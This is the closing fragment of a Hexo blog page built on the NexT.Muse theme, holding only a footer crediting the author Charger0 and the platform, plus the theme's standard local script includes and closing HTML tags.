  <span class="author" itemprop="copyrightHolder">Charger0</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
